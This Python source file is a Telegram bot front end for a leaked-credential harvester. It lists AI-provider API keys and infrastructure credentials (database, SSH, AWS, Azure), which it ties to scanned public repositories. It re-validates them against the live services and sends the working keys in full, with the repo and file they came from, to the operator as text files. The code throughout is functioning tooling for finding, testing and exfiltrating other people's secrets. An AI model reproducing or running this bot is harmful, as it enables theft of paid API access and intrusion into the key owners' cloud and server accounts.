"""
Telegram interactive key vault — inline keyboard menu.
Pure httpx long-polling, no extra dependencies.

Flow:
  /start | /keys  →  main menu  (categories with live counts)
  category btn    →  sub-menu   (providers with counts + "All in …")
  provider btn    →  re-validate → send .txt file
  "All in …" btn  →  re-validate all in category → send .txt file
  📊 Stats        →  DB summary (edits current message)
  🔄 Reval All    →  re-validate every is_valid=1 key → summary

Security: only TELEGRAM_CHAT_ID can interact (all other senders get ignored).
"""

import asyncio
import io
import json
import logging
from datetime import datetime, timezone

import httpx

import db
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
from validators import validate as _validate

log = logging.getLogger(__name__)

_BASE  = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
_OWNER = str(TELEGRAM_CHAT_ID)

# ── Provider metadata (emoji + display name) ──────────────────────────────
_PROV: dict[str, dict] = {
    "openai":       {"e": "🟢", "n": "OpenAI GPT"},
    "openai_image": {"e": "🖼️",  "n": "OpenAI DALL·E"},
    "anthropic":    {"e": "🟣", "n": "Anthropic Claude"},
    "google":       {"e": "🔵", "n": "Google Gemini"},
    "deepseek":     {"e": "🟡", "n": "DeepSeek"},
    "kimi":         {"e": "🌙", "n": "Kimi / Moonshot"},
    "glm":          {"e": "💜", "n": "Zhipu GLM"},
    "grok":         {"e": "✖️",  "n": "xAI Grok"},
    "perplexity":   {"e": "🔮", "n": "Perplexity"},
    "openrouter":   {"e": "🔀", "n": "OpenRouter"},
    "huggingface":  {"e": "🤗", "n": "HuggingFace"},
    "ark":          {"e": "🔴", "n": "Seedance 2.0 Std"},
    "ark_fast":     {"e": "🚀", "n": "Seedance 2.0 Fast"},
    "happyhorse":   {"e": "🐴", "n": "HappyHorse"},
    "kling":        {"e": "🎞️",  "n": "Kling AI"},
    "runway":       {"e": "✈️",  "n": "Runway ML"},
    "fal":          {"e": "⚗️", "n": "fal.ai"},
    "replicate":    {"e": "🔁", "n": "Replicate"},
    "fireworks":    {"e": "🎆", "n": "Fireworks AI"},
    "elevenlabs":   {"e": "🟠", "n": "ElevenLabs"},
    "inworld":      {"e": "🗣️",  "n": "Inworld AI"},
    "suno":         {"e": "🎵", "n": "Suno Music"},
    # Aggregators (one key → Claude/Gemini/GPT/GPT Image/Nano Banana access)
    "aimlapi":      {"e": "🌀", "n": "AIMLAPI"},
    "deepinfra":    {"e": "🟦", "n": "DeepInfra"},
    "hyperbolic":   {"e": "🌈", "n": "Hyperbolic"},
    "novita":       {"e": "🎨", "n": "NovitaAI"},
    "commonstack":  {"e": "🪙", "n": "Commonstack"},
    # Search / agent tools
    "serper":       {"e": "🔍", "n": "Serper.dev"},
    # Image gen
    "stability":    {"e": "🎨", "n": "Stability AI"},
    # Video gen
    "luma":         {"e": "🌙", "n": "Luma Dream Machine"},
    "pika":         {"e": "🎬", "n": "Pika Labs"},
    # Video understanding
    "twelvelabs":   {"e": "📹", "n": "TwelveLabs"},
    # 2026-05 additions
    "pixverse":     {"e": "🎥", "n": "PixVerse"},
    "siliconflow":  {"e": "🌊", "n": "SiliconFlow"},
    "firecrawl":    {"e": "🔥", "n": "Firecrawl"},
    "portkey":      {"e": "🚪", "n": "Portkey AI"},
    "krea":         {"e": "🎭", "n": "Krea AI"},
    "hedra":        {"e": "🎬", "n": "Hedra"},
    "wavespeed":    {"e": "🌐", "n": "WaveSpeed AI"},
}

# ── Category → provider mapping ───────────────────────────────────────────
_CATS: dict[str, dict] = {
    "video": {
        "e": "🎬", "n": "AI Video",
        "p": ["ark", "ark_fast", "happyhorse", "kling", "runway", "fal", "replicate", "fireworks",
              "luma", "pika", "twelvelabs",
              "pixverse", "hedra", "krea", "wavespeed"],
    },
    "text": {
        "e": "💬", "n": "AI Text",
        "p": ["openai", "anthropic", "google", "deepseek", "kimi", "glm", "grok",
              "perplexity", "openrouter", "huggingface",
              "aimlapi", "deepinfra", "hyperbolic", "commonstack",
              "siliconflow", "portkey"],
    },
    "image": {
        "e": "🖼️", "n": "AI Image",
        "p": ["openai_image", "fal", "replicate", "fireworks", "stability",
              "aimlapi", "novita", "deepinfra", "krea", "wavespeed"],
    },
    "aggregator": {
        "e": "🌐", "n": "Aggregators (Claude/Gemini/GPT proxy)",
        "p": ["openrouter", "aimlapi", "deepinfra", "hyperbolic", "novita",
              "commonstack", "siliconflow", "portkey"],
    },
    "voice": {
        "e": "🎙️", "n": "AI Voice",
        "p": ["elevenlabs", "inworld"],
    },
    "music": {
        "e": "🎵", "n": "AI Music",
        "p": ["suno"],
    },
    "tools": {
        "e": "🛠️", "n": "Search / Agent Tools",
        "p": ["serper", "firecrawl"],
    },
    "all": {
        "e": "🔌", "n": "All Providers",
        "p": list(_PROV.keys()),
    },
}

# ── Telegram API wrapper ──────────────────────────────────────────────────

async def _api(client: httpx.AsyncClient, method: str, **kw) -> dict:
    try:
        r = await client.post(f"{_BASE}/{method}", json=kw, timeout=35)
        data = r.json()
        if not data.get("ok"):
            log.debug("tg %s nok: %s", method, data.get("description", ""))
        return data
    except Exception as e:
        log.debug("tg %s err: %s", method, e)
        return {}


# ── Menu builders ─────────────────────────────────────────────────────────

def _counts() -> dict[str, int]:
    return db.get_valid_count_by_provider()


def _infra_counts() -> dict:
    """Return {total, high, medium, low} infra counts."""
    try:
        s = db.get_infra_stats()
        return {"total": s.get("total", 0), "high": s.get("high", 0), "medium": s.get("medium", 0)}
    except Exception:
        return {"total": 0, "high": 0, "medium": 0}


def _main_text() -> str:
    return (
        "🔑 <b>Key Vault</b>\n\n"
        "Выбери категорию — покажу провайдеры с живыми ключами.\n"
        "Перед отправкой файла — <b>авто-перевалидация</b>."
    )


def _main_keyboard(counts: dict[str, int]) -> dict:
    rows = []
    for cid in ("video", "text", "image", "voice", "music", "tools", "all"):
        cat   = _CATS[cid]
        # 'all' is the headline AI-counter category — exclude serper since
        # it's a search-tool API, not a general AI provider. Serper is still
        # accessible via the dedicated 'tools' category button.
        provs = cat["p"]
        if cid == "all":
            provs = [p for p in provs if p != "serper"]
        total = sum(counts.get(p, 0) for p in provs)
        rows.append([{"text": f"{cat['e']} {cat['n']}  ({total})", "callback_data": f"c:{cid}"}])
    ic = _infra_counts()
    infra_label = f"🏗️ Infra Creds  (🔴{ic['high']} / 🟡{ic['medium']})"
    rows.append([{"text": infra_label, "callback_data": "i"}])
    rows.append([
        {"text": "📊 Stats",        "callback_data": "s"},
        {"text": "🔄 Reval All",   "callback_data": "rv"},
        {"text": "↻ Refresh",      "callback_data": "m"},
    ])
    return {"inline_keyboard": rows}


_CAT_PAGE_SIZE = 12  # auto-paginate when category has more providers than this


def _cat_pages(cid: str) -> int:
    n = len(_CATS[cid]["p"])
    return max(1, (n + _CAT_PAGE_SIZE - 1) // _CAT_PAGE_SIZE)


def _cat_text(cid: str, counts: dict[str, int], page: int = 0) -> str:
    cat   = _CATS[cid]
    provs = cat["p"]
    pages = _cat_pages(cid)
    page  = max(0, min(page, pages - 1))

    header = f"{cat['e']} <b>{cat['n']}</b>"
    if pages > 1:
        header += f"  <i>(стр. {page + 1}/{pages})</i>"
    lines = [header, ""]

    page_provs = provs[page * _CAT_PAGE_SIZE : (page + 1) * _CAT_PAGE_SIZE]
    for prov in page_provs:
        cnt  = counts.get(prov, 0)
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        mark = "✅" if cnt > 0 else "⬜"
        lines.append(f"  {mark} {meta['e']} {meta['n']}: <b>{cnt}</b>")
    lines.append("\nВыбери провайдер или забери всё сразу.")
    return "\n".join(lines)


def _cat_keyboard(cid: str, counts: dict[str, int], page: int = 0) -> dict:
    cat   = _CATS[cid]
    provs = cat["p"]
    pages = _cat_pages(cid)
    page  = max(0, min(page, pages - 1))

    page_provs = provs[page * _CAT_PAGE_SIZE : (page + 1) * _CAT_PAGE_SIZE]
    rows = []
    buf  = []
    for prov in page_provs:
        cnt  = counts.get(prov, 0)
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        buf.append({"text": f"{meta['e']} {meta['n']} ({cnt})", "callback_data": f"p:{prov}"})
        if len(buf) == 2:
            rows.append(buf)
            buf = []
    if buf:
        rows.append(buf)

    if pages > 1:
        nav = []
        if page > 0:
            nav.append({"text": "◀ Prev", "callback_data": f"c:{cid}:{page - 1}"})
        nav.append({"text": f"· {page + 1}/{pages} ·", "callback_data": "noop"})
        if page < pages - 1:
            nav.append({"text": "Next ▶", "callback_data": f"c:{cid}:{page + 1}"})
        rows.append(nav)

    total = sum(counts.get(p, 0) for p in provs)
    rows.append([{"text": f"📦 Все {cat['n']} ({total})", "callback_data": f"g:{cid}"}])
    rows.append([{"text": "◀ Назад", "callback_data": "m"}])
    return {"inline_keyboard": rows}


# ── Key export helpers ────────────────────────────────────────────────────

_SEM: asyncio.Semaphore | None = None


def _get_sem() -> asyncio.Semaphore:
    global _SEM
    if _SEM is None:
        _SEM = asyncio.Semaphore(8)
    return _SEM


async def _revalidate_and_export(
    providers: list[str],
    label: str,
) -> tuple[bytes, int, int, int]:
    """
    Re-validate all is_valid=1 keys for the given providers concurrently.
    Returns (txt_bytes, total_checked, n_alive, n_dead).
    """
    all_rows: list[dict] = []
    for prov in providers:
        all_rows.extend(db.get_valid_keys_by_provider(prov))

    if not all_rows:
        return b"", 0, 0, 0

    async def _one(row: dict) -> bool:
        async with _get_sem():
            ok = await _validate(row["provider"], row["key_full"])
        db.update_key_validity(row["key_hash"], ok)
        return ok

    results = await asyncio.gather(*(_one(r) for r in all_rows))
    alive = sum(1 for r in results if r)
    dead  = sum(1 for r in results if not r)

    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    lines = [
        "╔══════════════════════════════════════════════════════════════════════╗",
        f"║  {label}",
        f"║  Exported: {now_str}",
        f"║  Checked: {len(all_rows)}  |  ✅ Valid: {alive}  |  ❌ Dead (removed): {dead}",
        "╚══════════════════════════════════════════════════════════════════════╝",
        "",
    ]

    by_prov: dict[str, list[dict]] = {}
    for row, ok in zip(all_rows, results):
        if ok:
            by_prov.setdefault(row["provider"], []).append(row)

    if not by_prov:
        lines.append("  (no live keys found after re-validation)")
    else:
        for prov in sorted(by_prov):
            rows_p = by_prov[prov]
            meta   = _PROV.get(prov, {"e": "🔑", "n": prov})
            lines.append("─" * 70)
            lines.append(f"  {meta['e']}  {meta['n'].upper()} — {len(rows_p)} key{'s' if len(rows_p) != 1 else ''}")
            lines.append("─" * 70)
            for r in rows_p:
                lines.append(f"  {r['key_full']}")
                lines.append(f"    📁 {r.get('repo', '?')}  |  {r.get('file_url', '')}")
            lines.append("")

    return "\n".join(lines).encode("utf-8"), len(all_rows), alive, dead


# ── Message / callback handlers ───────────────────────────────────────────

async def _handle_message(client: httpx.AsyncClient, msg: dict):
    chat_id = str(msg.get("chat", {}).get("id", ""))
    if chat_id != _OWNER:
        return
    text = msg.get("text", "")
    if text in ("/start", "/keys"):
        counts = _counts()
        await _api(client, "sendMessage",
                   chat_id=chat_id,
                   text=_main_text(),
                   parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))


async def _handle_callback(client: httpx.AsyncClient, cbq: dict):
    msg     = cbq.get("message", {})
    chat_id = str(msg.get("chat", {}).get("id", ""))
    msg_id  = msg.get("message_id")
    cbq_id  = cbq.get("id", "")
    data    = cbq.get("data", "")

    if chat_id != _OWNER:
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="❌ Not authorized")
        return

    # ── Main menu ─────────────────────────────────────────────────────
    if data == "m":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        counts = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=_main_text(), parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))
        return

    # ── Pagination tap on the page-indicator button (silent ack) ──────
    if data == "noop":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        return

    # ── Category sub-menu (с пагинацией: c:cid  |  c:cid:page) ─────────
    if data.startswith("c:"):
        rest  = data[2:]
        parts = rest.split(":", 1)
        cid   = parts[0]
        try:
            page = int(parts[1]) if len(parts) > 1 else 0
        except ValueError:
            page = 0
        if cid not in _CATS:
            await _api(client, "answerCallbackQuery", callback_query_id=cbq_id, text="?")
            return
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        counts = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=_cat_text(cid, counts, page), parse_mode="HTML",
                   reply_markup=_cat_keyboard(cid, counts, page))
        return

    # ── Stats ─────────────────────────────────────────────────────────
    if data == "s":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        s     = db.get_stats()
        ic    = _infra_counts()
        # Serper.dev is a search-tool API, not a "general AI provider".
        # Subtract from headline AI-keys counters so the digest reflects
        # actual AI-API findings; serper still accessible via the
        # 🛠️ "Search/Agent Tools" category button.
        by_prov_full = s.get("by_provider", [])
        serper_total = sum(r["total"] for r in by_prov_full if r["provider"] == "serper")
        serper_valid = sum(r["valid"] for r in by_prov_full if r["provider"] == "serper")
        keys_found_ai = s["keys_found"] - serper_total
        keys_valid_ai = s["keys_valid"] - serper_valid

        lines = [
            "📊 <b>Database Stats</b>",
            "",
            f"📁 Repos scanned:  <b>{s['repos_scanned']}</b>",
            f"📄 Files scanned:  <b>{s['files_scanned']}</b>",
            f"🔑 AI keys found:  <b>{keys_found_ai}</b>",
            f"✅ AI keys valid:  <b>{keys_valid_ai}</b>",
            f"🏗️ Infra creds:   <b>{ic['total']}</b>  (🔴{ic['high']} high / 🟡{ic['medium']} medium)",
            "",
            "<b>By provider:</b>",
        ]
        by_prov = {r["provider"]: r for r in by_prov_full if r["total"] > 0}
        # Hide serper from main listing — accessible via tools category
        by_prov.pop("serper", None)
        # Seedance 2.0 — show ark + ark_fast combined
        ark_std  = by_prov.pop("ark",      None)
        ark_fast = by_prov.pop("ark_fast", None)
        if ark_std or ark_fast:
            ts = (ark_std["total"]  if ark_std  else 0)
            tf = (ark_fast["total"] if ark_fast else 0)
            vs = (ark_std["valid"]  if ark_std  else 0)
            vf = (ark_fast["valid"] if ark_fast else 0)
            mark = "✅" if (vs + vf) > 0 else "  "
            lines.append(
                f"{mark} 🔴🚀 Seedance 2.0: {ts+tf} found, "
                f"<b>{vs+vf} valid</b>  (Std {vs} / Fast {vf})"
            )
        for row in sorted(by_prov.values(), key=lambda r: -r["total"]):
            if row["provider"] not in _PROV:
                continue
            meta = _PROV[row["provider"]]
            v    = row["valid"]
            t    = row["total"]
            mark = "✅" if v > 0 else "  "
            lines.append(f"{mark} {meta['e']} {meta['n']}: {t} found, <b>{v} valid</b>")
        # Append timestamp so re-clicking Refresh always changes content
        # (Telegram silently fails editMessageText when content is identical)
        lines.append(f"\n<i>Updated: {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}</i>")
        back_kb = {"inline_keyboard": [
            [{"text": "🔄 Refresh Stats",                "callback_data": "s"}],
            [{"text": "🗑️ Reset SHA dedup (force rescan)", "callback_data": "xsha"}],
            [{"text": "◀ Назад", "callback_data": "m"}],
        ]}
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text="\n".join(lines), parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # ── Infra credentials ─────────────────────────────────────────────
    if data == "i":
        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
        ic = _infra_counts()
        txt = (
            f"🏗️ <b>Infrastructure Credentials</b>\n\n"
            f"🔴 High risk:   <b>{ic['high']}</b>\n"
            f"🟡 Medium risk: <b>{ic['medium']}</b>\n"
            f"Total:         <b>{ic['total']}</b>\n\n"
            "Выбери уровень риска:"
        )
        kb = {"inline_keyboard": [
            [{"text": f"🔴 High Risk ({ic['high']})",   "callback_data": "ih"}],
            [{"text": f"🟡 Medium Risk ({ic['medium']})", "callback_data": "im"}],
            [{"text": f"📦 All Infra ({ic['total']})",   "callback_data": "ia"}],
            [{"text": "◀ Назад", "callback_data": "m"}],
        ]}
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=txt, parse_mode="HTML", reply_markup=kb)
        return

    if data in ("ih", "im", "ia"):
        risk_map  = {"ih": "high", "im": "medium", "ia": None}
        label_map = {"ih": "🔴 High Risk", "im": "🟡 Medium Risk", "ia": "📦 All Infra"}
        risk  = risk_map[data]
        label = label_map[data]
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Загружаю…")
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"🏗️ <b>{label}</b> — формирую файл…",
                   parse_mode="HTML")

        rows = db.get_infra_results(risk_filter=risk, limit=500)
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "i"}]]}

        if not rows:
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text=f"🏗️ <b>{label}</b>\n\n<i>Нет данных.</i>",
                       parse_mode="HTML", reply_markup=back_kb)
            return

        _RISK_E = {"high": "🔴", "medium": "🟡", "low": "⚪"}
        _CRED_E = {"database": "🗄️", "ssh": "🔐", "aws": "☁️",
                   "alibaba": "🔶", "azure": "🔷", "infra": "🚀"}
        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        lines = [
            "╔══════════════════════════════════════════════════════════════════════╗",
            f"║  🏗️ {label}",
            f"║  Exported: {now_str}",
            f"║  Total: {len(rows)} findings",
            "╚══════════════════════════════════════════════════════════════════════╝",
            "",
        ]
        by_type: dict[str, list] = {}
        for r in rows:
            by_type.setdefault(r["cred_type"], []).append(r)

        for ctype in sorted(by_type, key=lambda t: -len(by_type[t])):
            ce = _CRED_E.get(ctype, "🔑")
            lines.append("─" * 70)
            lines.append(f"  {ce}  {ctype.upper()} — {len(by_type[ctype])} findings")
            lines.append("─" * 70)
            for r in by_type[ctype]:
                re_ = _RISK_E.get(r.get("risk_level", "low"), "⚪")
                dest = f"  →  {r['destination']}" if r.get("destination") else ""
                try:
                    reasons = ", ".join(json.loads(r.get("risk_reasons", "[]"))[:3])
                except Exception:
                    reasons = str(r.get("risk_reasons", ""))
                lines.append(f"  {re_} {r['cred_full']}{dest}")
                lines.append(f"    📁 {r['repo']}  |  {r.get('file_url', '')}")
                if reasons:
                    lines.append(f"    ⚠️  {reasons}")
            lines.append("")

        content = "\n".join(lines).encode("utf-8")
        fname = f"infra_{data}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
        try:
            async with httpx.AsyncClient(timeout=60) as fc:
                await fc.post(
                    f"{_BASE}/sendDocument",
                    data={"chat_id": chat_id,
                          "caption": f"🏗️ {label}: {len(rows)} findings"},
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
        except Exception as e:
            log.error("infra send doc err: %s", e)

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"🏗️ <b>{label}</b>\n\n✅ {len(rows)} findings отправлено",
                   parse_mode="HTML", reply_markup=back_kb)
        return

    # ── Revalidate all ────────────────────────────────────────────────
    if data == "rv":
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Запускаю…")
        rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
        if not rows:
            back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text="ℹ️ Нет ключей для перевалидации.",
                       reply_markup=back_kb)
            return

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"⏳ Перевалидирую <b>{len(rows)}</b> ключей… подожди.",
                   parse_mode="HTML")

        async def _one(row: dict) -> bool:
            async with _get_sem():
                ok = await _validate(row["provider"], row["key_full"])
            db.update_key_validity(row["key_hash"], ok)
            return ok

        results  = await asyncio.gather(*(_one(r) for r in rows))
        dead     = sum(1 for r in results if not r)
        alive    = sum(1 for r in results if r)
        counts   = _counts()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"✅ <b>Перевалидация готова</b>\n\n"
                         f"Проверено: {len(rows)}\n"
                         f"✅ Живых: <b>{alive}</b>\n"
                         f"❌ Мёртвых: <b>{dead}</b>"),
                   parse_mode="HTML",
                   reply_markup=_main_keyboard(counts))
        return

    # ── Get single provider ───────────────────────────────────────────
    if data.startswith("p:"):
        prov = data[2:]
        meta = _PROV.get(prov, {"e": "🔑", "n": prov})
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Перевалидирую…")
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"⏳ {meta['e']} <b>{meta['n']}</b> — перевалидация…",
                   parse_mode="HTML")

        content, checked, alive, dead = await _revalidate_and_export(
            [prov], f"{meta['e']} {meta['n']} — Key Export"
        )
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}

        if not content or alive == 0:
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                             f"Проверено: {checked}  ❌ Мёртвых: {dead}\n"
                             "<i>Живых ключей нет.</i>"),
                       parse_mode="HTML",
                       reply_markup=back_kb)
            return

        fname = f"{prov}_keys_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                         f"✅ Живых: {alive}  |  ❌ Мёртвых: {dead}\n"
                         "Отправляю файл…"),
                   parse_mode="HTML")
        try:
            async with httpx.AsyncClient(timeout=60) as fc:
                await fc.post(
                    f"{_BASE}/sendDocument",
                    data={"chat_id": chat_id,
                          "caption": f"{meta['e']} {meta['n']}: {alive} live key{'s' if alive != 1 else ''}",
                          "parse_mode": "HTML"},
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
        except Exception as e:
            log.error("bot send doc err: %s", e)

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{meta['e']} <b>{meta['n']}</b>\n\n"
                         f"✅ {alive} ключей отправлено\n"
                         f"❌ {dead} убрано из базы"),
                   parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # ── Get all in category ───────────────────────────────────────────
    if data.startswith("g:"):
        cid = data[2:]
        if cid not in _CATS:
            await _api(client, "answerCallbackQuery", callback_query_id=cbq_id, text="?")
            return
        cat = _CATS[cid]
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Перевалидирую…")
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=f"{cat['e']} <b>{cat['n']}</b> — перевалидация…",
                   parse_mode="HTML")

        content, checked, alive, dead = await _revalidate_and_export(
            cat["p"], f"{cat['e']} {cat['n']} — Key Export"
        )
        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]}

        if not content or alive == 0:
            await _api(client, "editMessageText",
                       chat_id=chat_id, message_id=msg_id,
                       text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                             f"Проверено: {checked}  ❌ Мёртвых: {dead}\n"
                             "<i>Живых ключей нет.</i>"),
                       parse_mode="HTML",
                       reply_markup=back_kb)
            return

        fname = f"{cid}_keys_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                         f"✅ Живых: {alive}  |  ❌ Мёртвых: {dead}\n"
                         "Отправляю файл…"),
                   parse_mode="HTML")
        try:
            async with httpx.AsyncClient(timeout=60) as fc:
                await fc.post(
                    f"{_BASE}/sendDocument",
                    data={"chat_id": chat_id,
                          "caption": f"{cat['e']} {cat['n']}: {alive} live key{'s' if alive != 1 else ''}"},
                    files={"document": (fname, io.BytesIO(content), "text/plain")},
                )
        except Exception as e:
            log.error("bot send doc err: %s", e)

        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"{cat['e']} <b>{cat['n']}</b>\n\n"
                         f"✅ {alive} ключей отправлено\n"
                         f"❌ {dead} убрано из базы"),
                   parse_mode="HTML",
                   reply_markup=back_kb)
        return

    # ── Reset SHA dedup table ─────────────────────────────────────────
    if data == "xsha":
        await _api(client, "answerCallbackQuery",
                   callback_query_id=cbq_id, text="⏳ Сбрасываю…")
        deleted = db.clear_scanned_files()
        await _api(client, "editMessageText",
                   chat_id=chat_id, message_id=msg_id,
                   text=(f"🗑️ <b>SHA dedup сброшен</b>\n\n"
                         f"Удалено: <b>{deleted:,}</b> записей\n\n"
                         "Следующий цикл — полный холодный rescan "
                         "по новым порогам (365d / 100★)."),
                   parse_mode="HTML",
                   reply_markup={"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "m"}]]})
        return

    # unknown data — just ack
    await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)


# ── Main polling loop ─────────────────────────────────────────────────────

async def bot_loop():
    """Long-poll Telegram getUpdates. Runs forever — cancelled on app shutdown."""
    if not TELEGRAM_BOT_TOKEN:
        log.info("tg_bot: TELEGRAM_BOT_TOKEN not set — bot disabled")
        return
    if not _OWNER or _OWNER == "0":
        log.info("tg_bot: TELEGRAM_CHAT_ID not set — bot disabled")
        return

    log.info("tg_bot: starting long-poll loop (owner=%s)", _OWNER)
    offset = 0

    async with httpx.AsyncClient(timeout=40) as client:
        while True:
            try:
                data = await _api(
                    client, "getUpdates",
                    offset=offset,
                    timeout=30,
                    allowed_updates=["message", "callback_query"],
                )
                updates = data.get("result") or []
                for upd in updates:
                    offset = upd["update_id"] + 1
                    try:
                        if "message" in upd:
                            await _handle_message(client, upd["message"])
                        elif "callback_query" in upd:
                            await _handle_callback(client, upd["callback_query"])
                    except Exception as e:
                        log.error("bot update handler err: %s", e)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                log.error("bot poll err: %s", e)
                await asyncio.sleep(5)
